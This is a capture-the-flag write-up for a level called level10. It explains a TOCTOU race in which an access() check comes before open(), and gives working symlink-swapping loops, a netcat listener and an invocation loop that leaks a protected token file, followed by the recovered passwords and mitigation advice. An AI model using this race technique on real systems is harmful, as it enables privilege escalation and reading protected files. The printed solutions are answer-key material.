# level10

## Goal

Exploit a race condition to read the protected `token` file and obtain the password for `flag10`.

## Enumeration

Inspect the binary:

```bash
strings level10
```

Interesting strings and functions:

```text
%s file host
sends file to host if you have access to it
Connecting to %s:6969 ..
You don't have access to %s
access
open
read
write
socket
connect
```

The program expects:

```bash
./level10 <file> <host>
```

It checks if the user has access to the file, then sends the file content to the host on port `6969`.

## Analysis

The vulnerable pattern is:

```text
access(file)
    ↓
open(file)
```

This creates a **TOCTOU** vulnerability:

```text
Time Of Check → Time Of Use
```

If the file path changes between the `access()` check and the `open()` call, the program can be tricked into opening a protected file.

## Exploitation

Create a readable file:

```bash
echo hello > /tmp/ok
```

Create a symlink target that will be switched rapidly:

```bash
ln -sf /tmp/ok /tmp/x
```

Run two loops to alternate the symlink:

```bash
while true; do ln -sf /tmp/ok /tmp/x; done
```

```bash
while true; do ln -sf /home/user/level10/token /tmp/x; done
```

Start a listener on port `6969`:

```bash
while true; do nc -l 6969; done
```

Run the vulnerable binary in a loop:

```bash
while true; do ./level10 /tmp/x 127.0.0.1; done
```

Eventually, the race succeeds:

```text
access("/tmp/x") -> /tmp/ok
open("/tmp/x")   -> /home/user/level10/token
```

The token is then sent to the netcat listener.

## Retrieved password

```text
woupa2yuojeeaaed06riuj63c
```

## Validation

Use the recovered password:

```bash
su flag10
getflag
```

Output:

```text
Check flag.Here is your token :
feulo4b72j7edeahuete3no7c
```

The returned token is the password for `level11`.

## Concept

This level demonstrates a **TOCTOU race condition**.

Execution flow:

```text
/tmp/x -> /tmp/ok
        ↓
access() succeeds
        ↓
/tmp/x is switched
        ↓
/tmp/x -> token
        ↓
open() reads token
        ↓
content is sent over TCP port 6969
```

## Security Impact

Using `access()` before `open()` is dangerous when the path can be modified by the user.

Safer approaches include:

* avoiding `access()` before `open()`;
* opening the file first, then checking permissions on the opened file descriptor;
* using `open()` with flags such as `O_NOFOLLOW` when symbolic links should not be followed;
* validating ownership and permissions with `fstat()` after opening.

## Resources

Useful commands:

```bash
strings level10

echo hello > /tmp/ok

while true; do ln -sf /tmp/ok /tmp/x; done
while true; do ln -sf /home/user/level10/token /tmp/x; done

while true; do nc -l 6969; done
while true; do ./level10 /tmp/x 127.0.0.1; done

su flag10
getflag
```
